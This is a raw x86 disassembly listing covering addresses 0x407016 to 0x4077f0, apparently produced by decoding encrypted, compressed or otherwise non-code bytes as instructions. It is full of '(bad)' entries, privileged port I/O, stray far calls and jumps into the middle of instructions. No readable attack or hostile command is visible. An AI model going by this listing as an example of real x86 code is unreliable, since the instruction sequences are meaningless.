  407016:	sbb    DWORD PTR [ebx+0x5870323],esi
  40701c:	es xchg edi,eax
  40701e:	imul   edx,DWORD PTR [edi],0x70463e34
  407024:	pop    esp
  407025:	mov    gs,WORD PTR [eax-0x23bbc912]
  40702b:	(bad)  
  40702c:	popa   
  40702d:	push   edi
  40702e:	xchg   edx,eax
  40702f:	pop    edi
  407030:	sbb    eax,0x41f8a7b9
  407035:	inc    ebp
  407036:	test   DWORD PTR [bx],ecx
  407039:	jge    0x407055
  40703b:	std    
  40703c:	cdq    
  40703d:	js     0x407049
  40703f:	test   al,0x6f
  407041:	mov    bl,0xab
  407043:	outs   dx,BYTE PTR ds:[esi]
  407044:	and    esi,edx
  407046:	(bad)  
  407047:	out    dx,al
  407048:	ret    0x380b
  40704b:	dec    eax
  40704c:	fwait
  40704d:	popf   
  40704e:	dec    eax
  40704f:	aad    0x11
  407051:	fdiv   st(1),st
  407053:	add    BYTE PTR [edi],ch
  407055:	adc    al,BYTE PTR [edx+0x7d929a18]
  40705b:	mov    ch,0xd5
  40705d:	sahf   
  40705e:	jae    0x406fe3
  407060:	push   edx
  407061:	mov    bh,0x3b
  407063:	mov    al,ds:0xaa137937
  407068:	jecxz  0x406ff0
  40706a:	mov    ah,0xa
  40706c:	lahf   
  40706d:	cmp    edi,0x4d
  407070:	cmc    
  407071:	mov    edx,0x47811f3c
  407076:	test   DWORD PTR [eax-0x5e11aa08],esp
  40707c:	stos   BYTE PTR es:[edi],al
  40707d:	mov    DWORD PTR [ebp-0x7c],ecx
  407080:	repnz xor DWORD PTR [esi],eax
  407083:	inc    ecx
  407084:	mov    edi,0x3c55a624
  407089:	popa   
  40708a:	dec    esp
  40708b:	clc    
  40708c:	test   ecx,esp
  40708e:	fld    DWORD PTR [edi]
  407090:	sbb    edi,DWORD PTR [ebx+0x225f98a4]
  407096:	xor    al,0xc3
  407098:	and    al,BYTE PTR [edi]
  40709a:	push   esi
  40709b:	cwde   
  40709c:	dec    ebx
  40709d:	neg    BYTE PTR [ecx+0x1c]
  4070a0:	mov    bh,0xc5
  4070a2:	int    0x48
  4070a4:	hlt    
  4070a5:	or     al,0x3e
  4070a7:	mov    ?,WORD PTR [esp+eiz*4]
  4070aa:	mov    BYTE PTR [esi],dh
  4070ac:	(bad)  
  4070ad:	loopne 0x407057
  4070af:	jo     0x4070b4
  4070b1:	xlat   BYTE PTR ds:[ebx]
  4070b2:	vpunpckhdq xmm4,xmm5,XMMWORD PTR [eax-0x1e]
  4070b7:	pop    edi
  4070b8:	add    dh,dh
  4070ba:	adc    eax,0xb11ace6d
  4070bf:	stos   DWORD PTR es:[edi],eax
  4070c0:	sub    DWORD PTR [ebp-0x4a],esi
  4070c3:	mov    ds:0x4d1323ef,al
  4070c8:	and    DWORD PTR [eax],0x24c01dfe
  4070ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070cf:	jge    0x4070b7
  4070d1:	jecxz  0x407101
  4070d3:	push   0xffffffb0
  4070d5:	(bad)  
  4070d6:	adc    ecx,DWORD PTR [edi]
  4070d8:	in     eax,0xd
  4070da:	call   0xed9729c6
  4070df:	mov    ah,0x1a
  4070e1:	lea    ecx,[ebp+edi*1-0x8eb2103]
  4070e8:	retf   
  4070e9:	loope  0x407071
  4070eb:	push   eax
  4070ec:	xchg   DWORD PTR [ecx-0x7b1e8ff0],esp
  4070f2:	push   cs
  4070f3:	aas    
  4070f4:	clc    
  4070f5:	push   eax
  4070f6:	daa    
  4070f7:	dec    ecx
  4070f8:	add    cl,dl
  4070fa:	test   DWORD PTR [edi-0x9],0x59b4e25e
  407101:	outs   dx,BYTE PTR ds:[esi]
  407102:	idiv   BYTE PTR [eax-0x52aca19a]
  407108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407109:	loop   0x40710b
  40710b:	sub    eax,0xdba9cf39
  407110:	push   edi
  407111:	je     0x407150
  407113:	test   DWORD PTR [edx],edx
  407115:	sbb    ebx,ebx
  407117:	(bad)  
  407118:	mov    esi,0xec95b530
  40711d:	int    0x8c
  40711f:	out    dx,al
  407120:	sar    esp,0x95
  407123:	push   0x55b2b42c
  407128:	mov    al,ch
  40712a:	jne    0x4071a5
  40712c:	ds sti 
  40712e:	pop    ss
  40712f:	pop    esi
  407130:	mov    esi,0x878e4629
  407135:	sub    DWORD PTR [ebp+0xd5fefd9],0x1b
  40713c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40713d:	sub    eax,0xd0e0ca8a
  407142:	or     DWORD PTR [edi+0x5d8e6c60],0x82292f2e
  40714c:	lods   al,BYTE PTR ds:[esi]
  40714d:	jne    0x407112
  40714f:	adc    al,0x4d
  407151:	push   edi
  407152:	mov    ebx,0x631e46b9
  407157:	xlat   BYTE PTR ds:[ebx]
  407158:	add    dl,BYTE PTR [ebx+0x657d4f10]
  40715e:	cmp    al,0x12
  407160:	(bad)  
  407161:	jmp    0x60ce:0x11d1ee65
  407168:	pop    esi
  407169:	test   DWORD PTR [edx],esp
  40716b:	jo     0x407105
  40716d:	xlat   BYTE PTR ds:[ebx]
  40716e:	mov    bh,BYTE PTR [ebx-0x2a]
  407171:	xlat   BYTE PTR ds:[ebx]
  407172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407173:	push   eax
  407174:	xchg   DWORD PTR [edx-0x42bfb2d5],edx
  40717a:	inc    ebx
  40717b:	mov    dh,0x29
  40717d:	push   0x605adaee
  407182:	xor    BYTE PTR [ebx-0x66],dl
  407185:	mov    eax,0xb3550c0d
  40718a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40718b:	int    0xa0
  40718d:	mov    BYTE PTR [edx],al
  40718f:	xor    esi,ebx
  407191:	adc    al,0x84
  407193:	imul   edx,DWORD PTR [eax+0x34],0x61
  407197:	adc    DWORD PTR [edi+0x5],esp
  40719a:	gs mov bh,0x91
  40719d:	xchg   ecx,eax
  40719e:	or     eax,0xd9be093e
  4071a3:	test   DWORD PTR [edx+0x29368d5b],esi
  4071a9:	fs and al,0xd5
  4071ac:	test   eax,0xf0f11872
  4071b1:	in     eax,dx
  4071b2:	mov    ds:0x88cf819e,al
  4071b7:	xor    BYTE PTR [ebx],bh
  4071b9:	les    esi,FWORD PTR [ecx+edi*8-0x6]
  4071bd:	(bad)  
  4071be:	out    0x43,al
  4071c0:	int    0x1
  4071c2:	in     al,dx
  4071c3:	cmp    BYTE PTR [ebx],dl
  4071c5:	xchg   ebx,eax
  4071c6:	lea    edi,[ebp-0xb36c4a2]
  4071cc:	pop    ss
  4071cd:	xchg   BYTE PTR [esi-0xe],ch
  4071d0:	dec    edx
  4071d1:	inc    edi
  4071d2:	ret    
  4071d3:	ret    
  4071d4:	cdq    
  4071d5:	pop    ss
  4071d6:	fiadd  DWORD PTR [ecx-0x3f7d7d45]
  4071dc:	or     eax,0xf60ad675
  4071e1:	mov    bl,0x3b
  4071e3:	sub    eax,0x8e99f053
  4071e8:	mov    ds:0xab170166,eax
  4071ed:	push   ds
  4071ee:	jne    0x4071ec
  4071f0:	in     al,0x53
  4071f2:	out    0x4d,eax
  4071f4:	xchg   ecx,eax
  4071f5:	adc    edi,0xffffff96
  4071f8:	xlat   BYTE PTR ds:[ebx]
  4071f9:	push   edi
  4071fa:	jp     0x4071dd
  4071fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071fd:	xchg   edx,eax
  4071fe:	fdiv   QWORD PTR [ebp+0x67]
  407201:	push   0x448cbf34
  407206:	jg     0x4071c3
  407208:	in     eax,0x69
  40720a:	mov    al,0xde
  40720c:	cld    
  40720d:	mov    DWORD PTR [ecx+0x6484c909],eax
  407213:	xor    ebp,DWORD PTR [ebx]
  407215:	sti    
  407216:	ds in  al,0x93
  407219:	mov    ds,WORD PTR [ecx]
  40721b:	jle    0x4071b2
  40721d:	mov    esi,0xb1e9a68e
  407222:	repz mov ds:0x7756cf87,al
  407228:	call   FWORD PTR [ecx+0x3a]
  40722b:	in     eax,dx
  40722c:	loope  0x4071bf
  40722e:	sub    eax,0x571bb5d0
  407233:	adc    ch,BYTE PTR [ebp-0x3825827f]
  407239:	mov    dl,dl
  40723b:	mov    eax,0xdafd5da5
  407240:	inc    ebp
  407241:	out    0xaf,eax
  407243:	push   esi
  407244:	mov    eax,ds
  407246:	dec    ebp
  407247:	lds    esp,FWORD PTR [edx+0xc83d880]
  40724d:	sti    
  40724e:	cmp    BYTE PTR [ecx+esi*1],ah
  407251:	out    0x22,eax
  407253:	mov    ds:0x365ab09d,eax
  407258:	jnp    0x407256
  40725a:	fnsave [edx]
  40725c:	outs   dx,DWORD PTR ds:[esi]
  40725d:	jp     0x4072bb
  40725f:	adc    cl,BYTE PTR [esi]
  407261:	add    eax,0xced577e0
  407266:	mov    eax,ds:0xbeb1d9a8
  40726b:	fwait
  40726c:	in     al,dx
  40726d:	xchg   edx,eax
  40726e:	xchg   esi,eax
  40726f:	imul   bx,sp,0x66ff
  407274:	dec    edi
  407275:	fisubr DWORD PTR [ecx]
  407277:	push   ecx
  407278:	mov    esp,0x5bce1e39
  40727d:	inc    esi
  40727e:	dec    ebx
  40727f:	test   al,0xff
  407281:	mov    bl,0x5
  407283:	cmp    eax,0x9f9c4859
  407288:	aaa    
  407289:	test   BYTE PTR [ecx-0xb],dh
  40728c:	pop    es
  40728d:	clc    
  40728e:	add    DWORD PTR gs:[esi-0x7a679f8d],0x6182ecbf
  407299:	and    eax,0x42a3978
  40729e:	fs leave 
  4072a0:	enter  0xb319,0x43
  4072a4:	(bad)  
  4072a6:	(bad)  
  4072a7:	mov    ecx,0xeeac7d0c
  4072ac:	mov    ebp,0x60ce881e
  4072b1:	out    dx,al
  4072b2:	dec    edi
  4072b3:	add    eax,0x8a3fb229
  4072b8:	(bad)  
  4072b9:	mov    BYTE PTR [esi+0x3b],dl
  4072bc:	dec    esp
  4072bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072be:	xor    ch,BYTE PTR [ebx-0x78d1454]
  4072c4:	sbb    BYTE PTR [edx],dh
  4072c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072c7:	cli    
  4072c8:	jecxz  0x407338
  4072ca:	sub    DWORD PTR [edi-0x75],ebp
  4072cd:	not    DWORD PTR [ebx]
  4072cf:	addr16 clc 
  4072d1:	nop
  4072d2:	sub    eax,DWORD PTR [esi+0xd]
  4072d5:	jne    0x407348
  4072d7:	adc    BYTE PTR [edx],bl
  4072d9:	pusha  
  4072da:	mov    dh,0xb3
  4072dc:	fst    DWORD PTR ss:[edx+0x15a1a437]
  4072e3:	xor    ah,BYTE PTR [edi-0x1fd8a3d4]
  4072e9:	ds mov dl,0xc1
  4072ec:	out    dx,eax
  4072ed:	inc    eax
  4072ee:	dec    ebp
  4072ef:	push   0x2c
  4072f1:	push   esp
  4072f2:	mov    ebp,0x167c39ec
  4072f7:	push   es
  4072f8:	xor    DWORD PTR [esi+0x5e5c9a22],esp
  4072fe:	retf   
  4072ff:	retf   0xed63
  407302:	sub    DWORD PTR [edi],esi
  407304:	ja     0x40731d
  407306:	loopne 0x4072a9
  407308:	push   ecx
  407309:	jns    0x4072c0
  40730b:	cmc    
  40730c:	cmp    eax,0x70a16da2
  407311:	push   0xffffff88
  407313:	cmp    esp,0xffffffea
  407316:	cmp    bh,dl
  407318:	adc    DWORD PTR [eiz*8-0x6275c824],0x66
  407320:	jo     0x4072f1
  407322:	shl    BYTE PTR ds:0x7cc5ac7d,cl
  407328:	dec    edx
  407329:	lock or cl,BYTE PTR [ebx]
  40732c:	test   BYTE PTR [edi-0x6f435c31],0xb2
  407333:	and    al,0x5e
  407335:	jbe    0x4072da
  407337:	pop    ecx
  407338:	iret   
  407339:	sti    
  40733a:	adc    al,0x20
  40733c:	dec    ecx
  40733d:	sahf   
  40733e:	push   eax
  40733f:	pop    ecx
  407340:	cmp    DWORD PTR [ebx+ecx*2+0x661409cb],ebp
  407347:	retf   0xd758
  40734a:	mov    es,ebx
  40734c:	clc    
  40734d:	loop   0x407364
  40734f:	xchg   esp,eax
  407350:	test   eax,0x2e71df88
  407355:	cs std 
  407357:	lods   al,BYTE PTR ds:[esi]
  407358:	pusha  
  407359:	mov    ch,0xb7
  40735b:	xchg   BYTE PTR [esi+eiz*8+0x71745071],dh
  407362:	sar    dl,1
  407364:	xor    esp,esi
  407366:	loopne 0x40737e
  407368:	lods   eax,DWORD PTR ds:[esi]
  407369:	fsub   DWORD PTR [ebp+edx*1-0xb]
  40736d:	push   esp
  40736e:	push   edx
  40736f:	and    BYTE PTR [ebx-0x1e],cl
  407372:	inc    edi
  407373:	add    esp,DWORD PTR [esi+0x4e]
  407376:	pop    ds
  407377:	sbb    ebp,DWORD PTR [edx+0x31]
  40737a:	add    BYTE PTR [ebx+0x36beaa53],dl
  407380:	ffree  st(7)
  407382:	push   es
  407383:	int3   
  407384:	adc    dh,ch
  407386:	cmp    BYTE PTR [edi+0x2c],al
  407389:	sub    bl,dl
  40738b:	not    BYTE PTR [ecx+0x55993c14]
  407391:	mov    ah,0x67
  407393:	push   cs
  407394:	inc    ebp
  407395:	add    DWORD PTR [ebp+0x68],eax
  407398:	pop    DWORD PTR [edx+esi*8-0x18432c50]
  40739f:	in     eax,dx
  4073a0:	lods   al,BYTE PTR ds:[esi]
  4073a1:	repz sbb BYTE PTR [ecx],al
  4073a4:	hlt    
  4073a5:	int3   
  4073a6:	sbb    DWORD PTR [ecx+edx*1-0x772c58c7],ebp
  4073ad:	xor    DWORD PTR [esi+0x1],esi
  4073b0:	inc    eax
  4073b1:	popa   
  4073b2:	rcr    DWORD PTR [esi+ebp*8-0x51654bf7],1
  4073b9:	xor    al,0x4f
  4073bb:	mov    ch,ah
  4073bd:	xchg   BYTE PTR [edx+0x28],ah
  4073c0:	or     BYTE PTR [edi+edx*8-0x5e],bl
  4073c4:	int3   
  4073c5:	outs   dx,DWORD PTR ds:[esi]
  4073c6:	xchg   esp,eax
  4073c7:	add    DWORD PTR [ebx],edx
  4073c9:	pop    edx
  4073ca:	inc    eax
  4073cb:	call   0x8779:0x461629d1
  4073d2:	push   ebx
  4073d3:	addr16 iret 
  4073d5:	call   0x9689:0xda35699b
  4073dc:	mov    WORD PTR [edx],es
  4073de:	cmp    eax,0x4966de5b
  4073e3:	inc    ebx
  4073e4:	mov    cs,WORD PTR [edi-0x78]
  4073e7:	or     BYTE PTR [ecx],0xa5
  4073ea:	xchg   edi,eax
  4073eb:	xor    ch,BYTE PTR [ebx-0x75d2194d]
  4073f1:	cwde   
  4073f2:	sub    al,0xdb
  4073f4:	ret    0x5875
  4073f7:	push   edx
  4073f8:	js     0x40737e
  4073fa:	jns    0x4073a5
  4073fc:	hlt    
  4073fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073fe:	(bad)  
  4073ff:	jmp    0xa3f3fb7e
  407404:	nop
  407405:	pop    eax
  407406:	test   eax,0x86cc9954
  40740b:	mov    cl,0xb
  40740d:	fistp  WORD PTR [edi+0x7a]
  407410:	jl     0x4073cb
  407412:	sub    DWORD PTR [ecx+ebx*4-0x74b9272b],eax
  407419:	jmp    0x7b5ab5be
  40741e:	loope  0x407434
  407420:	inc    BYTE PTR [edx-0x13]
  407423:	fwait
  407424:	add    al,0xec
  407426:	jg     0x407420
  407428:	ds mov ecx,0x3e8ed1e0
  40742e:	dec    eax
  40742f:	sbb    ebp,DWORD PTR [edx]
  407431:	dec    esp
  407432:	int3   
  407433:	arpl   WORD PTR [ebx+0x3f],bp
  407436:	(bad)  
  407437:	mov    ds:0xa32b5833,al
  40743c:	dec    ebx
  40743d:	shr    BYTE PTR [ecx-0x61085595],1
  407443:	inc    eax
  407444:	out    0xe8,eax
  407446:	add    eax,0x114e206f
  40744b:	push   esi
  40744c:	xor    BYTE PTR [esi+0x7feceeb1],cl
  407452:	xchg   edi,eax
  407453:	stos   DWORD PTR es:[edi],eax
  407454:	retf   0xf718
  407457:	mov    ch,0x43
  407459:	arpl   WORD PTR [eax],dx
  40745b:	sbb    ah,BYTE PTR [edx]
  40745d:	loope  0x40747d
  40745f:	stos   BYTE PTR es:[edi],al
  407460:	jb     0x4074a1
  407462:	inc    esi
  407463:	pop    esi
  407464:	repnz push esi
  407466:	adc    edx,ebp
  407468:	xor    DWORD PTR [edx-0x3abee2dd],edx
  40746e:	call   0xcf21a151
  407473:	xor    al,0x9c
  407475:	adc    esi,DWORD PTR [ebx]
  407477:	jae    0x40746d
  407479:	popa   
  40747a:	ss jge 0x407480
  40747d:	rol    ebx,0x9c
  407480:	std    
  407481:	sub    eax,0x85dd0f71
  407486:	loope  0x4074a6
  407488:	pop    es
  407489:	push   0x77
  40748b:	test   eax,0xb319afb3
  407490:	leave  
  407491:	fsubr  DWORD PTR [ebx+ebp*8-0x29312147]
  407498:	std    
  407499:	repnz pop es
  40749b:	call   0x1bb8:0x80c0cfa4
  4074a2:	fld    QWORD PTR [ebp-0x133d7ae9]
  4074a8:	rcr    DWORD PTR [esi],1
  4074aa:	rol    ah,cl
  4074ac:	xchg   ebp,eax
  4074ad:	push   ebx
  4074ae:	jae    0x407462
  4074b0:	in     eax,dx
  4074b1:	or     BYTE PTR [esi],dl
  4074b3:	mov    ebp,0x7ce3110c
  4074b8:	add    DWORD PTR [edx-0x15b53b79],ecx
  4074be:	and    cl,BYTE PTR [ecx+edx*1+0x1cea644b]
  4074c5:	push   esi
  4074c6:	enter  0x3597,0x17
  4074ca:	nop
  4074cb:	cmp    BYTE PTR [edx+0x41],0xa4
  4074cf:	adc    eax,0x65965db6
  4074d4:	in     eax,dx
  4074d5:	clc    
  4074d6:	and    ebx,DWORD PTR [esi+0x5]
  4074d9:	add    BYTE PTR [esi-0x24f420c1],0xde
  4074e0:	inc    eax
  4074e1:	repz test DWORD PTR [eax],ebx
  4074e4:	retf   0xf505
  4074e7:	loope  0x4074fd
  4074e9:	clc    
  4074ea:	or     BYTE PTR [esi+0x1ee3cb3a],dh
  4074f0:	sbb    al,0x9
  4074f2:	mov    ds:0xb9fc3b64,eax
  4074f7:	(bad)  
  4074f8:	aam    0x19
  4074fa:	push   eax
  4074fb:	mov    eax,ds:0x48b6dcff
  407500:	and    ah,cl
  407502:	(bad)  
  407503:	lock pop es
  407505:	lods   al,BYTE PTR ds:[esi]
  407506:	stos   BYTE PTR es:[edi],al
  407507:	jo     0x40757a
  407509:	xchg   edx,eax
  40750a:	adc    BYTE PTR [ecx+0x7e],dl
  40750d:	xchg   ecx,eax
  40750e:	outs   dx,DWORD PTR ds:[esi]
  40750f:	xor    ch,BYTE PTR [eax]
  407511:	iret   
  407512:	lods   al,BYTE PTR ds:[esi]
  407513:	rcl    DWORD PTR [esp+edi*1],cl
  407516:	retf   0x234b
  407519:	idiv   DWORD PTR [esi]
  40751b:	sahf   
  40751c:	jns    0x407587
  40751e:	popf   
  40751f:	xor    BYTE PTR [ebx+0x32e1a957],0x13
  407526:	mov    bh,0x8e
  407528:	dec    ecx
  407529:	lock arpl di,cx
  40752c:	push   0x54069eb0
  407531:	or     al,0x2f
  407533:	data16 sti 
  407535:	mov    edi,0x498fc500
  40753a:	inc    ebx
  40753b:	stos   BYTE PTR es:[edi],al
  40753c:	xchg   ebp,eax
  40753d:	adc    esi,0x54bac3c9
  407543:	push   ecx
  407544:	dec    esp
  407545:	and    eax,0x64515b5f
  40754a:	adc    bh,bh
  40754c:	fdiv   DWORD PTR fs:[edx-0x7d]
  407550:	jg     0x407564
  407552:	(bad)  
  407553:	jne    0x4075a5
  407555:	lods   al,BYTE PTR ds:[esi]
  407556:	add    BYTE PTR [ecx],al
  407558:	or     eax,0x5e57252d
  40755d:	idiv   BYTE PTR [edi]
  40755f:	iret   
  407560:	jg     0x4075a1
  407562:	pop    ebx
  407563:	std    
  407564:	dec    ebp
  407565:	ds ins DWORD PTR es:[edi],dx
  407567:	ffree  st(5)
  407569:	jmp    0x7c1cb3b2
  40756e:	cmc    
  40756f:	int    0x94
  407571:	mov    cs,WORD PTR [eax]
  407573:	inc    ebp
  407574:	fnstsw WORD PTR [eax]
  407576:	lds    esi,FWORD PTR [esi+0x11]
  407579:	(bad)
  40757c:	nop
  40757d:	pop    ebp
  40757e:	adc    eax,esi
  407580:	leave  
  407581:	push   esi
  407582:	stos   DWORD PTR es:[edi],eax
  407583:	inc    edi
  407584:	fcomp  QWORD PTR [ebx-0x32]
  407587:	push   ss
  407588:	mov    esp,0x47e9cc5b
  40758d:	outs   dx,DWORD PTR ds:[esi]
  40758e:	scas   al,BYTE PTR es:[edi]
  40758f:	imul   ebx,DWORD PTR [ebp+0x733e91cb],0x22baa3
  407599:	sbb    bl,BYTE PTR [ecx-0x6cf11b65]
  40759f:	int    0x43
  4075a1:	leave  
  4075a2:	das    
  4075a3:	fs jg  0x4075e9
  4075a6:	jns    0x407545
  4075a8:	cld    
  4075a9:	pop    ss
  4075aa:	xchg   ebp,eax
  4075ab:	add    eax,0xb8ff86e7
  4075b0:	in     eax,0xb2
  4075b2:	popa   
  4075b3:	pop    ss
  4075b4:	jnp    0x40758d
  4075b6:	bound  ecx,QWORD PTR [edx+0x6d0633c9]
  4075bc:	out    0xad,eax
  4075be:	rcl    eax,0x46
  4075c1:	mov    ds:0x1b121dd8,al
  4075c6:	push   ecx
  4075c7:	push   esp
  4075c8:	lods   eax,DWORD PTR ds:[esi]
  4075c9:	jge    0x407596
  4075cb:	mov    esp,0x544b98ba
  4075d0:	clc    
  4075d1:	stc    
  4075d2:	data16 jbe 0x407585
  4075d5:	loope  0x407584
  4075d7:	or     DWORD PTR [esi+0x67],edi
  4075da:	shl    BYTE PTR [esi+0x5380da89],cl
  4075e0:	push   ebx
  4075e1:	mov    ch,0xf1
  4075e3:	sub    al,0x1a
  4075e5:	pop    esp
  4075e6:	fiadd  WORD PTR [ebp+0x20aef6e]
  4075ec:	push   0xffffffeb
  4075ee:	es xchg ecx,eax
  4075f0:	fcmovbe st,st(3)
  4075f2:	mov    WORD PTR [edi+ebx*8-0x5c],?
  4075f6:	nop
  4075f7:	jle    0x407644
  4075f9:	push   ebx
  4075fa:	xor    ah,BYTE PTR [ebx]
  4075fc:	test   DWORD PTR ss:[edx+0x14],0xd9a8ce84
  407604:	jle    0x4075ad
  407606:	pop    esi
  407607:	fist   WORD PTR [esi]
  407609:	sbb    eax,0x28d8ed8c
  40760e:	pop    edx
  40760f:	mov    esi,0xd79edaa0
  407614:	loopne 0x407608
  407616:	sub    DWORD PTR ds:0x57464ed6,esi
  40761c:	sbb    cl,dh
  40761e:	fs addr16 inc edx
  407621:	int    0xdc
  407623:	repnz out dx,al
  407625:	mov    es,WORD PTR [edi-0x4a02cc69]
  40762b:	loopne 0x407664
  40762d:	sbb    ebx,esi
  40762f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407630:	mov    ch,0xe1
  407632:	pop    edx
  407633:	stos   BYTE PTR es:[edi],al
  407634:	lahf   
  407635:	mov    DWORD PTR [esi],edi
  407637:	inc    ebx
  407638:	push   edx
  407639:	in     al,0x2c
  40763b:	fiadd  DWORD PTR [edx-0x6e]
  40763e:	data16 rol BYTE PTR [ebx+eax*1+0x1a],1
  407643:	shr    DWORD PTR [edx-0x734a419d],cl
  407649:	fcomip st,st(2)
  40764b:	pop    eax
  40764c:	imul   ecx,eax,0x3f
  40764f:	rcr    BYTE PTR [edx+0x11],1
  407652:	add    eax,0x479cccaf
  407657:	js     0x407626
  407659:	xchg   esp,eax
  40765a:	stos   BYTE PTR es:[edi],al
  40765b:	and    eax,0xeaefea3f
  407660:	and    esp,DWORD PTR [esi-0x7a]
  407663:	cmc    
  407664:	movd   mm3,DWORD PTR [eax]
  407667:	adc    bh,dl
  407669:	fisub  WORD PTR [edx+0x12]
  40766c:	sbb    BYTE PTR [ecx],al
  40766e:	and    DWORD PTR [ebx-0x112e4898],esi
  407674:	cmp    bh,BYTE PTR [ecx+0x2eae899b]
  40767a:	pushf  
  40767b:	aas    
  40767c:	mov    eax,0xe9870ee8
  407681:	out    dx,eax
  407682:	(bad)  
  407683:	bound  eax,QWORD PTR [edi+0x7e]
  407686:	loop   0x40761c
  407688:	adc    eax,0x608d7d45
  40768d:	and    DWORD PTR [edi-0x5e907ca5],edx
  407693:	in     eax,dx
  407694:	test   eax,0x83092b67
  407699:	jle    0x4076fb
  40769b:	cmp    cl,0xd1
  40769e:	test   eax,0x3643250d
  4076a3:	dec    edi
  4076a4:	scas   al,BYTE PTR es:[edi]
  4076a5:	jg     0x4076fb
  4076a7:	push   0xffffffa4
  4076a9:	fdivr  st(5),st
  4076ab:	hlt    
  4076ac:	lds    eax,FWORD PTR [ecx-0x6d]
  4076af:	add    edi,DWORD PTR [eax+0x1a26210a]
  4076b5:	inc    esi
  4076b6:	and    eax,0xf8c6860e
  4076bb:	lods   eax,DWORD PTR ds:[esi]
  4076bc:	pop    ebx
  4076bd:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076bf:	std    
  4076c0:	sbb    bl,BYTE PTR [eax]
  4076c2:	fisubr WORD PTR [edx+0x7]
  4076c5:	les    ebp,FWORD PTR [esi-0x6b]
  4076c8:	jg     0x40773f
  4076ca:	sub    dl,dh
  4076cc:	xor    ch,dh
  4076ce:	ss dec esi
  4076d0:	mov    cl,0x8e
  4076d2:	into   
  4076d3:	aad    0x7d
  4076d5:	xchg   ebp,eax
  4076d6:	mov    eax,0x1197f0b0
  4076db:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4076dd:	push   es
  4076de:	in     eax,0x4e
  4076e0:	fdivr  QWORD PTR [edi-0x4263917f]
  4076e6:	add    ebp,esp
  4076e8:	loope  0x4076a3
  4076ea:	mov    ch,0xd3
  4076ec:	xor    al,0x3a
  4076ee:	mov    dl,0x53
  4076f0:	ffreep st(5)
  4076f2:	xor    bh,cl
  4076f4:	mov    cl,BYTE PTR [ebp+0x43]
  4076f7:	push   ecx
  4076f8:	test   al,0xd6
  4076fa:	popf   
  4076fb:	jno    0x4076e3
  4076fd:	jne    0x40770f
  4076ff:	push   esi
  407700:	or     BYTE PTR [edx],0x7c
  407703:	ret    0x9b0a
  407706:	or     dl,BYTE PTR [eax]
  407708:	dec    edi
  407709:	scas   eax,DWORD PTR es:[edi]
  40770a:	mov    al,0x14
  40770c:	bound  eax,QWORD PTR [edi+0x1c]
  40770f:	dec    ecx
  407710:	es jns 0x407744
  407713:	pusha  
  407714:	pop    edx
  407715:	mov    al,ds:0x68550025
  40771a:	sbb    BYTE PTR [ebx-0x5dc84b48],dh
  407720:	enter  0xa72b,0xb8
  407724:	test   DWORD PTR [edx-0x45],0xdda26676
  40772b:	sub    ch,BYTE PTR [edi]
  40772d:	loope  0x407774
  40772f:	ins    DWORD PTR es:[edi],dx
  407730:	sub    edi,DWORD PTR [edi-0x277d2d84]
  407736:	sbb    cl,BYTE PTR [ebx]
  407738:	and    eax,0x8c2bd64
  40773d:	mov    esi,DWORD PTR [edx]
  40773f:	mov    al,0x23
  407741:	adc    al,0xcb
  407743:	push   ecx
  407744:	jnp    0x40773c
  407746:	ja     0x407728
  407748:	fisttp WORD PTR [ecx+eiz*8-0x2f]
  40774c:	and    eax,0x71880c9c
  407751:	cmp    esp,eax
  407753:	int3   
  407754:	retf   0x16d7
  407757:	sbb    ebx,DWORD PTR [ebp-0x38]
  40775a:	dec    eax
  40775b:	outs   dx,BYTE PTR ds:[esi]
  40775c:	xchg   edx,eax
  40775d:	pop    ebx
  40775e:	pop    ebx
  40775f:	outs   dx,DWORD PTR ds:[esi]
  407760:	or     DWORD PTR [edi],0x6a
  407763:	jbe    0x40772e
  407765:	pop    esp
  407766:	and    BYTE PTR [edx+eiz*2],bl
  407769:	mov    bh,0xda
  40776b:	sub    eax,0x1c7529b5
  407770:	mov    dh,0xb
  407772:	xchg   edx,eax
  407773:	xor    DWORD PTR [esi+0x40],edi
  407776:	sahf   
  407777:	dec    ecx
  407778:	adc    eax,0xd151ab98
  40777d:	imul   eax,DWORD PTR [edi+ebx*4-0xb],0x66
  407782:	xor    dh,ch
  407784:	adc    BYTE PTR [edi+0x7d],ch
  407787:	push   0x7ee932e9
  40778c:	nop
  40778d:	pusha  
  40778e:	mov    dh,0x14
  407790:	adc    BYTE PTR [ecx-0x26d4d3c0],0xe2
  407797:	cmp    ah,dl
  407799:	ins    DWORD PTR es:[edi],dx
  40779a:	or     esp,DWORD PTR [edi+0x3f]
  40779d:	mov    eax,ds:0x7ee8fe04
  4077a2:	and    al,0xac
  4077a4:	sbb    al,0x35
  4077a6:	jg     0x40777b
  4077a8:	add    DWORD PTR [edx+eiz*8+0x536e55c8],0xffffffa6
  4077b0:	aad    0x0
  4077b2:	inc    eax
  4077b3:	aad    0x9e
  4077b5:	leave  
  4077b6:	call   0xa5a6f834
  4077bb:	aad    0x55
  4077bd:	or     eax,0x950fd0e2
  4077c2:	mov    dh,0x94
  4077c4:	pop    edi
  4077c5:	mov    edi,esi
  4077c7:	jns    0x40781f
  4077c9:	mov    eax,ds:0xd4805d66
  4077ce:	daa    
  4077cf:	jnp    0x407820
  4077d1:	pop    eax
  4077d2:	sbb    esi,DWORD PTR [esi-0x29]
  4077d5:	into   
  4077d6:	shl    DWORD PTR [edi],0xf8
  4077d9:	aam    0xa7
  4077db:	push   esp
  4077dc:	loope  0x4077c2
  4077de:	lods   al,BYTE PTR ds:[esi]
  4077df:	xor    al,0x93
  4077e1:	cmp    eax,DWORD PTR ds:[edx+0x40]
  4077e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077e6:	jno    0x40781e
  4077e8:	jp     0x407794
  4077ea:	or     eax,0x6043a705
  4077ef:	inc    ecx
  4077f0:	push   edi
